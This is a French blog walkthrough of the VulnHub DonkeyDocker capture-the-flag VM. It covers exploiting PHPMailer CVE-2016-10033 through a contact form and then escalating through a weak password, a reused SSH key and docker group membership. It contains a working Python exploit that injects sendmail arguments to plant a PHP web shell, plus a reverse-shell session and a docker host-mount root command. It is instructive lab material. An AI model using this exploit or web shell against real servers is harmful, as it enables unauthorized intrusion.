# Solution du CTF DonkeyDocker de VulnHub

MonkeyMocker
------------

[DonkeyDocker](https://www.vulnhub.com/series/donkeydocker,118/) est le nom d'un CTF créé par [Dennis Herrmann](https://zer0-day.pw/) et qui a une profondeur surprenante pour une VM de 1.2Go et configuré par défaut pour n'utiliser que 1024Mo.  

On est loin du médiocre [Web Machine N7](http://devloop.users.sourceforge.net/index.php?article242/solution-du-ctf-web-machine-n7-de-vulnhub) avec sa VM de 5.7Go et ses 8192Mo de RAM pour faire tourner 3 pauvres scripts PHP.  

Bref ici [on va tutoyer les anges !](https://www.youtube.com/watch?v=MQuDX1Pb7A0)
You got mail
------------

```plain
$ sudo nmap -T5 -sCV -p- 192.168.101.132 
[sudo] Mot de passe de root :  
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for 192.168.101.132 
Host is up (0.00067s latency). 
Not shown: 65533 closed tcp ports (reset) 
PORT   STATE SERVICE VERSION 
22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0) 
| ssh-hostkey:  
|   2048 9c:38:ce:11:9c:b2:7a:48:58:c9:76:d5:b8:bd:bd:57 (RSA) 
|   256 d7:5e:f2:17:bd:18:1b:9c:8c:ab:11:09:e8:a0:00:c2 (ECDSA) 
|_  256 06:f0:0c:d8:bc:9b:21:95:a5:d2:70:39:08:57:b3:07 (ED25519) 
80/tcp open  http    Apache httpd 2.4.10 ((Debian)) 
|_http-title: Docker Donkey 
| http-robots.txt: 3 disallowed entries  
|_/contact.php /index.php /about.php 
|_http-server-header: Apache/2.4.10 (Debian) 
MAC Address: 00:0C:29:39:2B:88 (VMware)
```

Le *robots.txt* veut nous interdire 3 scripts PHP. Ce sont toutefois les liens que l'on aurait trouvé par simple exploration.  

Une redirection est en place qui fait que tout accès à une URL finissant par *.php* nous redirige vers le nom du fichier sans suffixe. Ça veut dire qu'armé de *Feroxbuster* il faut la jouer fine et ignorer les redirections 301 quand on demande des fichiers.  

A l'opposé, si on demande un nom de dossier qui existe vraiment, on obtiendra un 301 et non un 404 car *Feroxbuster* ne rajoute pas par défaut le slash final. Heureusement l'outil dispose d'une option *-f* à ce sujet.  

On trouve de cette façon les dossiers *dist* et *mailer*. Le premier est vide quand au second on y trouve différents dossiers et fichiers :  

```plain
$ feroxbuster -w /fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt -u http://192.168.101.132/mailer/ -n -s 200,403 -f
--- snip ---
403       11l       32w      302c http://192.168.101.132/mailer/docs/ 
403       11l       32w      304c http://192.168.101.132/mailer/extras/ 
200       48l      843w     6289c http://192.168.101.132/mailer/examples/ 
403       11l       32w      302c http://192.168.101.132/mailer/test/ 
403       11l       32w      306c http://192.168.101.132/mailer/language/ 
200       84l      314w     4090c http://192.168.101.132/
```

On identifie facilement *PHPMailer* via la page d'index qui liste ses codes d'exemples. Ce logiciel est connu pour être vulnérable à une faille critique d'exécution de code [et plusieurs exploits existent sur exploit-db](https://www.exploit-db.com/search?q=phpmailer).  

Le plus important à souligner ici c'est que si cette librairie PHP est faillible ce n'est pas directement via un de ses codes d'exemples mais via les scripts qui peuvent l'employer.  

Ici la page *contact.php* dispose d'un formulaire permettant de saisir nom, email et message ce qui laisse très fortement supposer que *PHPMailer* est utilisé en fond.  

Si je réduis le code HTML pour ne garder que le nécessaire alors le formulaire ressemble à ceci :  

```html
<form class="form-horizontal" action="" method="POST" enctype="multipart/form-data">
		<input name="name" type="text" class="form-control" id="inputName" placeholder="Name">
		<input name="email" type="email" class="form-control" id="inputEmail" placeholder="Email">
		<textarea name="message" class="form-control" rows="3" id="textArea"></textarea>
		<button type="submit" class="btn btn-primary"><i class="fa fa-paper-plane-o" aria-hidden="true"></i> Submit</button>
		<input type="hidden" name="action" value="submit">
</form>
```

Et justement quand on regarde les différents exploits ils utilisent bien ces champs. Les données sont envoyées en multipart (comme s'il s'agissait d'un upload de fichier) et les champs *name* et *message* peuvent être utilisés pour passer du code PHP.  

La vulnérabilité est expliquée dans [cet advisory de Dawid Golunski](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html).  

En background *PHPMailer* appelle la commande Linux *sendmail*. La commande complète est formée via les données passées par *PHPMailer*. Ça pourrait se voir comme de l'échappement de commande sauf que ce n'est pas le cas ici. A la place l'exploit se sert de l'option *-X* de *sendmail* permettant de spécifier le path d'un fichier de log où seront écrites les données relatives à l'envoi du mail.  

Parmi ces données se trouvent l'entrée *name* et le *message* d'où l'utilisation de ces champs.  

En conclusion l'exploit ne fait qu'écrire du code PHP à l'emplacement que l'on souhaite mais rien n'est exécuté directement. Il faut appeler la backdoor générée pour provoquer le payload final.  

Après avoir essuyé quelques échecs avec certains exploits j'ai basculé [sur celui de Metasploit](https://www.exploit-db.com/exploits/41688) et là ça a correctement fonctionné (on peut dire ce qu'on veut mais les exploits sont de qualité).  

On peut activer l'option *HttpTrace* ou mettre en écoute l'interface réseau pour mieux comprendre l'exploitation. Ce que fait *Metasploit* c'est envoyer la première requête qui déclenche la commande *sendmail*. Celle-ci est exécuté de façon synchrone du coup la requête n'a pas de réponse avant plusieurs minutes.  

Pendant ce temps *Metasploit* envoie des requêtes régulières pour demander le fichier PHP qui devrait être déposé sur le serveur. C'est ce script qui contient le payload qui nous donnera par exemple le reverse shell demandé. Ainsi après un moment :  

```plain
$ ncat -l -p 4444 -v
Ncat: Version 7.92 ( https://nmap.org/ncat ) 
Ncat: Listening on :::4444 
Ncat: Listening on 0.0.0.0:4444 
Ncat: Connection from 192.168.101.132. 
Ncat: Connection from 192.168.101.132:33360. 
id 
uid=33(www-data) gid=33(www-data) groups=33(www-data) 
pwd 
/www 
echo '<?php system($_GET["cmd"]); ?>' > shell.php 
```

My turn
-------

Après avoir solutionné le CTF (voir la suite) je me suis repenché sur l'exploit et les actions qu'il provoque sur le serveur. Ça semble plus logique de mettre cette partie à cet endroit de l'article.  

J'ai réécrit l'exploit en utilisant la librairie *python-requests*. Pour avoir du multipart il suffit de remplir le dictionnaire *files* mais par défaut *python-requests* rajoute un *filename* pour chaque entrée qui semble faire échouer l'exploitation. J'ai résolu le problème via l'utilisation du tuple *(None, str)* pour les valeurs (de mémoire le premier élément du tuple est le nom de fichier).  

```python
import sys 
import requests 

RW_DIR = "/www" 
URL = "http://192.168.101.132/contact" 

# PHPMailer < 5.2.18 Remote Code Execution PoC Exploit (CVE-2016-10033) 
payload = f'"attacker\\" -oQ/tmp/ -X{RW_DIR}/phpcode.php  some"@email.com' 

# Bypass / PHPMailer < 5.2.20 Remote Code Execution PoC Exploit (CVE-2016-10045) 
# payload = f"\"attacker\\' -oQ/tmp/ -X{RW_DIR}/phpcode.php  some\"@email.com" 

RCE_PHP_CODE = "zz<?php system($_GET['cmd']); ?>zz" 

response = requests.post( 
    URL, 
    files={ 
        "action": (None, "submit"), 
        "name": (None, RCE_PHP_CODE + "_name"), 
        "email": (None, payload), 
        "message": (None, RCE_PHP_CODE + "_message"), 
    }, 
) 
print(response.status_code)
```

L'emplacement où écrire le fichier PHP n'a pas été choisit au hasard : en commentaire sur la page de contact on peut voir ceci :  

```html
	  <strong><i class="fa fa-exclamation-triangle" aria-hidden="true"></i> Oh snap!</strong> Something goes wrong, damn it!
	  <!-- FIXME!: www-path: /www -->	
```

On sait que ça fonctionne quand la requête met trois plombes à s'exécuter :D  

Le premier signe de l'exploitation côté serveur c'est l'apparition du process sendmail :  

```plain
2022/01/13 07:20:24 CMD: UID=33   PID=12964  | sh -c /usr/sbin/sendmail -t -i  -f"attacker\\" -oQ/tmp/ -X/www/phpcode.php  some\"@email.com
```

Aussitôt le fichier est créé mais il est vide :  

```plain
-rw-r--r--    ? 33       33              0 Jan 13 08:22 /www/phpcode.php
```

Notez aussi le timestamp sur le fichier : pour une raison que j'ignore il est une heure dans le futur. Vraisemblablement *sendmail* s'en sert pour savoir où il en est.  

Plus tard le fichier a gagné du contenu :  

```plain
-rw-r--r--    ? 33       33            609 Jan 13 08:25 /www/phpcode.php
```

A ce stade c'est déjà gagné :  

```plain
12964 >>> some"@email.com... Unbalanced '"' 
12964 <<< To: Donkey <admin@dockerdonkey.com> 
12964 <<< Subject: Message from zz<?php system($_GET['cmd']); ?>zz_name 
12964 <<< X-PHP-Originating-Script: 0:class.phpmailer.php 
12964 <<< Date: Thu, 13 Jan 2022 07:20:24 +0000 
12964 <<< From: Docker Donkey Server <"attacker\" -oQ/tmp/ -X/www/phpcode.php  some"@email.com> 
12964 <<< Message-ID: <0acccfff72a67c6805d080b6d6f5ab8f@192.168.101.132> 
12964 <<< X-Mailer: PHPMailer 5.2.17 (https://github.com/PHPMailer/PHPMailer) 
12964 <<< MIME-Version: 1.0 
12964 <<< Content-Type: text/plain; charset=iso-8859-1 
12964 <<<
```

Si on attend encore le message fait aussi son apparition :  

```plain
-rw-r--r--    ? 33       33           1675 Jan 13 08:27 /www/phpcode.php
```

```plain
12964 <<< zz<?php system($_GET['cmd']); ?>zz_message 
12964 <<<  
12964 <<< [EOF] 
12964 === CONNECT [127.0.0.1] 
12964 <<< 220 12081bd067cc Python SMTP proxy version 0.2 
12964 >>> EHLO 12081bd067cc 
12964 <<< 502 Error: command "EHLO" not implemented 
12964 >>> HELO 12081bd067cc 
12964 <<< 250 12081bd067cc 
12964 >>> MAIL From:<attacker@12081bd067cc> 
12964 <<< 250 Ok 
12964 >>> RCPT To:<some"@email.com"@12081bd067cc> 
12964 <<< 250 Ok 
12964 >>> DATA 
12964 <<< 354 End data with <CR><LF>.<CR><LF> 
12964 >>> Received: (from www-data@localhost) 
12964 >>>       by 12081bd067cc (8.14.4/8.14.4/Submit) id 20D7P4U8012964 
12964 >>>       for some"@email.com; Thu, 13 Jan 2022 07:25:04 GMT 
12964 >>> X-Authentication-Warning: 12081bd067cc: www-data set sender to attacker\ using -f 
12964 >>> X-Authentication-Warning: 12081bd067cc: Processed from queue /tmp/ 
12964 >>> To: Donkey <admin@dockerdonkey.com> 
12964 >>> Subject: Message from zz<?php system($_GET['cmd']); ?>zz_name 
12964 >>> X-PHP-Originating-Script: 0:class.phpmailer.php 
12964 >>> Date: Thu, 13 Jan 2022 07:20:24 +0000
```

Et après un moment on a la fin :  

```plain
12964 >>> From: Docker Donkey Server <"attacker\" -oQ/tmp/ -X/www/phpcode.php  some"@email.com> 
12964 >>> Message-ID: <0acccfff72a67c6805d080b6d6f5ab8f@192.168.101.132> 
12964 >>> X-Mailer: PHPMailer 5.2.17 (https://github.com/PHPMailer/PHPMailer) 
12964 >>> MIME-Version: 1.0 
12964 >>> Content-Type: text/plain; charset=iso-8859-1 
12964 >>>  
12964 >>> zz<?php system($_GET['cmd']); ?>zz_message 
12964 >>>  
12964 >>> . 
12964 <<< 250 Ok 
12964 >>> QUIT 
12964 <<< 221 Bye
```

Bref le champ *name* (qui apparaît plus tôt) est plus intéressant que le champ *message*. D'ailleurs Metasploit n'utilise pas ce dernier.  

L'exploitation laisse des traces, on a ainsi deux fichier créés dans */tmp* :  

```plain
-rw-rw----    1 www-data www-data       44 Jan 13 07:27 df20D7P4U8012964
-rw-rw----    1 www-data www-data     1015 Jan 13 07:29 qf20D7P4U8012964
```

Le premier ne contient que le message :   

```plain
zz<?php system($_GET['cmd']); ?>zz_message
```

Le second ressemble à un mix d'entêtes et de charabia :  

```plain
V8 
T1642058704 
K1642058944 
N1 
P60509 
Msome"@email.com... Unbalanced '"' 
Fbs 
$_www-data@localhost 
${daemon_flags}c u 
Sattacker\ 
rRFC822; admin@dockerdonkey.com 
RPFD:Donkey <admin@dockerdonkey.com> 
H?P?Return-Path: <�g> 
H??Received: (from www-data@localhost) 
        by 12081bd067cc (8.14.4/8.14.4/Submit) id 20D7P4U8012964 
        for some"@email.com; Thu, 13 Jan 2022 07:25:04 GMT 
H??X-Authentication-Warning: 12081bd067cc: www-data set sender to attacker\ using -f 
H??X-Authentication-Warning: 12081bd067cc: Processed from queue /tmp/ 
H??To: Donkey <admin@dockerdonkey.com> 
H??Subject: Message from zz<?php system($_GET['cmd']); ?>zz_name 
H??X-PHP-Originating-Script: 0:class.phpmailer.php 
H??Date: Thu, 13 Jan 2022 07:20:24 +0000 
H??From: Docker Donkey Server <"attacker\" -oQ/tmp/ -X/www/phpcode.php  some"@email.com> 
H??Message-ID: <0acccfff72a67c6805d080b6d6f5ab8f@192.168.101.132> 
H??X-Mailer: PHPMailer 5.2.17 (https://github.com/PHPMailer/PHPMailer) 
H??MIME-Version: 1.0 
H??Content-Type: text/plain; charset=iso-8859-1 
.
```

Jules de chez Smith en face
---------------------------

Avec mon nouveau shell je découvre un script à la racine :  

```bash
$ cat /main.sh 
#!/bin/bash 

# change permission 
chown smith:users /home/smith/flag.txt 

# Start apache 
source /etc/apache2/envvars 
a2enmod rewrite 
apachectl -f /etc/apache2/apache2.conf 

sleep 3 
tail -f /var/log/apache2/*& 

# Start our fake smtp server 
python -m smtpd -n -c DebuggingServer localhost:25
```

On remarque ainsi que l'utilisateur *smith* cache un flag.  

Comme rien ne semble prometteur malgré l'excellent LinPEAS je tente de me connecter avec *smith* / *smith* et ça fonctionne !  

```plain
smith@12081bd067cc:~$ cat flag.txt  
This is not the end, sorry dude. Look deeper! 
I know nobody created a user into a docker 
container but who cares? ;-) 

But good work! 
Here a flag for you: flag0{9fe3ed7d67635868567e290c6a490f8e} 

PS: I like 1984 written by George ORWELL
```

Certes, très bon livre si vous avez les tripes solides. L'indice est plus parlant quand on regarde du côté de SSH :  

```plain
smith@12081bd067cc:~/.ssh$ cat authorized_keys  
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICEBBzcffpLILgXqY77+z7/Awsovz/jkhOd/0fDjvEof orwell@donkeydocker
```

Comme la clé privée de *smith* est présente je tente de l'utiliser avec le compte *orwell* sur le serveur SSH vu au début.  

```plain
$ ssh  -i smith.key orwell@192.168.101.132 
Welcome to 

  ___           _            ___          _ 
 |   \ ___ _ _ | |_____ _  _|   \ ___  __| |_____ _ _ 
 | |) / _ \ ' \| / / -_) || | |) / _ \/ _| / / -_) '_| 
 |___/\___/_||_|_\_\___|\_, |___/\___/\__|_\_\___|_| 
                        |__/ 
                             Made with <3 v.1.0 - 2017 

This is my first boot2root - CTF VM. I hope you enjoy it. 
if you run into any issue you can find me on Twitter: @dhn_ 
or feel free to write me a mail to: 

 - Email: dhn@zer0-day.pw 
 - GPG key: 0x2641123C 
 - GPG fingerprint: 4E3444A11BB780F84B58E8ABA8DD99472641123C 

Level:       I think the level of this boot2root challange 
             is hard or intermediate. 

Try harder!: If you are confused or frustrated don't forget 
             that enumeration is the key! 

Thanks:      Special thanks to @1nternaut for the awesome 
             CTF VM name! 

Feedback:    This is my first boot2root - CTF VM, please 
             give me feedback on how to improve! 

Looking forward to the write-ups! 

donkeydocker:~$ cat flag.txt  
You tried harder! Good work ;-) 

Here a flag for your effort: flag01{e20523853d6733721071c2a4e95c9c60}
```

Boys on the docks
-----------------

L'utilisateur fait partie du groupe Docker. Est-ce que j'ai besoin d'en dire d'avantage ?   

```plain
donkeydocker:~$ docker images 
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE 
donkeydocker        latest              ae644a321321        4 years ago         276 MB 
debian              jessie              8cedef9d7368        4 years ago         123 MB

donkeydocker:~$ docker run -v /:/mnt/host -it 8cedef9d7368 /bin/bash
donkeydocker:~# cd /mnt/host/root
donkeydocker:~# cat flag.txt  
YES!! You did it :-). Congratulations! 

I hope you enjoyed this CTF VM. 

Drop me a line on twitter @dhn_, or via email dhn@zer0-day.pw 

Here is your flag: flag2{60d14feef575bacf5fd8eb06ec7cd8e7}
```

Sous le capot
-------------

Et pour terminer l'article voici le Dockerfile du CTF :  

```plain
FROM debian:jessie 

# this Dockerfile based on: https://github.com/opsxcq/exploit-CVE-2016-10033 
MAINTAINER dhn <dhn@zer0-day.pw 

RUN apt-get update && \ 
    apt-get upgrade -y && \ 
    DEBIAN_FRONTEND=noninteractive apt-get install -y \ 
    apache2 \ 
    php5 \ 
    python \  
    sendmail \ 
    whois \ 
    wget \ 
    && \ 
    apt-get clean && \ 
    rm -rf /var/lib/apt/lists/* 

COPY www /www 
COPY src /www/mailer/ 

RUN chmod 777 -R /www 

# Add user smith 
RUN useradd -p $(mkpasswd smith) \ 
        -d /home/smith \ 
        -m -g users \ 
        -s /bin/bash smith  

RUN chmod 700 /home/smith 
COPY misc/flag.txt /home/smith 

COPY virtual-host /etc/apache2/sites-enabled/000-default.conf 

EXPOSE 80 

COPY main.sh / 
ENTRYPOINT ["/main.sh"] 
CMD ["default"]
```


*Published January 13 2022 at 22:17*